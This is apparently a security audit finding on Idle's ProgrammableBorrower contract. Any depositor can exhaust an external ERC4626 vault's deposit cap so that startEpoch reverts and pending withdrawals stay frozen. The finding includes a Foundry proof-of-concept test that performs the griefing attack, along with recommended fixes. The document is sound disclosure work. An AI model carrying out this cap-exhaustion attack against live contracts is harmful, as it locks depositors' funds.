### Title
Public ERC4626 deposit-cap exhaustion can indefinitely block programmable epoch starts - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower.onStartEpoch` requires the configured ERC4626 vault to accept the entire on-hand underlying balance in one `deposit` call. Any vault depositor can consume the remaining global deposit capacity before `startEpoch`, causing the hook—and therefore the whole epoch transition—to revert. Pending withdrawal receipts consequently remain immature and cannot be claimed while the condition is maintained.

### Finding Description
`IdleCDOEpochVariant.startEpoch` transfers the CDO's available underlying to the programmable borrower and then invokes `onStartEpoch`. [1](#0-0) 

`ProgrammableBorrower.onStartEpoch` measures the pre-deposit position correctly, but `_depositToVault` is then called for `underlyingToken.balanceOf(address(this))` without checking `vault.maxDeposit` or catching a failed deposit. [2](#0-1) 

`_depositToVault` performs a single all-or-nothing `vault.deposit(_assetAmount, address(this))`. [3](#0-2) 

ERC4626 vaults expose receiver-specific or global deposit limits through `maxDeposit`, and `deposit` is allowed to revert when the full amount cannot be accepted. [4](#0-3) 

For a finite remaining capacity `H` and a next-epoch deposit requirement `R`, a depositor can first deposit `H - R + 1`, leaving less than `R` of capacity; the programmable borrower's deposit then reverts and `startEpoch` is rolled back atomically. [5](#0-4) 

### Impact Explanation
A withdrawal request burns the requester's principal-backed strategy tokens, mints receipt tokens, and records the claim in `pendingWithdraws`. [6](#0-5) 

The claim path reverts while `epochNumber <= lastWithdrawRequest`, so the requester needs a later epoch to be started and stopped before claiming. [7](#0-6) 

The epoch number only advances through the strategy `deposit` call reached on a successful stop, meaning a blocked `startEpoch` prevents the receipt from maturing. [8](#0-7) 

The quantified impact is temporary freezing of `IdleCreditVault.pendingWithdraws()` and postponement of all capital represented by `totEpochDeposits()` for as long as the attacker keeps deposit capacity below the amount `ProgrammableBorrower` would deposit. [9](#0-8) 

The assets are not stolen, but withdrawal timing is controlled by an unprivileged external-vault depositor and can be renewed whenever new deposit capacity appears.

### Likelihood Explanation
The attacker does not need a privileged role, borrower access, or write access to Idle contracts; ordinary ERC4626 deposit rights are sufficient. [10](#0-9) 

The required capital is only the remaining vault capacity minus the next Idle deposit plus one wei, rather than the vault's total TVL; if the next buffer deposit equals the remaining capacity, one additional wei is sufficient to exhaust it. [11](#0-10) 

The attack is easiest when the configured MetaMorpho-style vault already has a finite, nearly filled supply cap, and it can be repeated after caps increase or after operators migrate capacity. [12](#0-11) 

### Recommendation
Before calling `_depositToVault`, read `vault.maxDeposit(address(this))` and deposit only `min(onHand, maxDeposit)`, leaving any excess underlying on the programmable-borrower contract. [12](#0-11) 

Because `epochStartVaultAssets` is snapshotted before the deposit and `availableToBorrow` includes both cash and vault assets, a partial deposit preserves the existing accounting and pending-withdrawal reservation. [13](#0-12) 

A defensive fallback should also treat a failed `deposit` as “hold cash for this epoch” rather than reverting the epoch transition, while retaining the current stop-time liquidity checks. [14](#0-13) 

### Proof of Concept
Add this regression to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`; it uses the existing mainnet-fork deployment and an actual capped ERC4626 vault:

```solidity
function testProgrammableBorrowerDepositCapGriefBlocksWithdrawal() external {
  _setUpProgrammableBorrowerCreditVault(
    GAUNTLET_FORK_BLOCK,
    GAUNTLET_USDC_PRIME
  );

  vm.prank(owner);
  cdoEpoch.setIsInterestMinted(true);

  uint256 initialDeposit = 10_000 * oneScale;
  idleCDO.depositAA(initialDeposit);

  vm.prank(manager);
  cdoEpoch.startEpoch();

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  // Create a receipt that can only be claimed after another epoch completes.
  cdoEpoch.requestWithdraw(
    aaTranche.balanceOf(address(this)),
    address(aaTranche)
  );
  uint256 pending = strategy.pendingWithdraws();
  assertGt(pending, 0);

  IERC4626 externalVault = IERC4626(address(morphoVault));
  uint256 headroom = externalVault.maxDeposit(address(programmableBorrower));
  assertGt(headroom, 0);
  assertLt(headroom, type(uint256).max);

  // A normal buffer deposit will be sent to ProgrammableBorrower on the next start.
  // Setting it equal to the current capacity minimizes the attacker's required deposit.
  address lp2 = makeAddr("lp2");
  deal(USDC, lp2, headroom, true);
  vm.startPrank(lp2);
  underlying.approve(address(cdoEpoch), headroom);
  idleCDO.depositAA(headroom);
  vm.stopPrank();

  // The attacker is only a public ERC4626 depositor. Depositing one wei leaves
  // headroom - 1 capacity, below the headroom-sized deposit required at start.
  address attacker = makeAddr("erc4626Depositor");
  deal(USDC, attacker, 1, true);
  vm.startPrank(attacker);
  underlying.approve(address(externalVault), 1);
  externalVault.deposit(1, attacker);
  vm.stopPrank();

  assertLt(
    externalVault.maxDeposit(address(programmableBorrower)),
    headroom
  );

  vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);

  vm.prank(manager);
  vm.expectRevert();
  cdoEpoch.startEpoch();

  // The request epoch has not been surpassed, so the receipt remains unclaimable.
  vm.expectRevert(NotAllowed.selector);
  cdoEpoch.claimWithdrawRequest();

  assertEq(strategy.pendingWithdraws(), pending);
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L270-298)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/interfaces/IERC4626.sol (L74-112)
```text
    /**
     * @dev Returns the maximum amount of the underlying asset that can be deposited into the Vault for the receiver,
     * through a deposit call.
     *
     * - MUST return a limited value if receiver is subject to some deposit limit.
     * - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.
     * - MUST NOT revert.
     */
    function maxDeposit(address receiver) external view returns (uint256 maxAssets);

    /**
     * @dev Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given
     * current on-chain conditions.
     *
     * - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit
     *   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called
     *   in the same transaction.
     * - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
     *   deposit would be accepted, regardless if the user has enough tokens approved, etc.
     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
     * - MUST NOT revert.
     *
     * NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
     * share price or some other type of condition, meaning the depositor will lose assets by depositing.
     */
    function previewDeposit(uint256 assets) external view returns (uint256 shares);

    /**
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
     *   deposit execution, and are accounted for during deposit.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     *
     * NOTE: most implementations will require pre-approval of the Vault with the Vault’s underlying asset token.
     */
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L61-65)
```text
  uint256 public pendingWithdraws;
  /// @notice pending instant withdraw requests
  uint256 public pendingInstantWithdraws;
  /// @notice counter for epoch deposits
  uint256 public totEpochDeposits;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-295)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L319-330)
```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L596-614)
```text
  function deposit(uint256 _amount)
    external
    virtual
    override
    returns (uint256) {
    _onlyIdleCDO();
    if (_amount > 0) {
      underlyingToken.safeTransferFrom(msg.sender, address(this), _amount);
      _mint(msg.sender, _amount);
    }

    if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
      // deposit done on stopEpoch (before setting the var to false) so we reset the counter
      totEpochDeposits = 0;
      epochNumber += 1;
    } else {
      // deposit done between epochs so we increase the counter
      totEpochDeposits += _amount;
    }
```
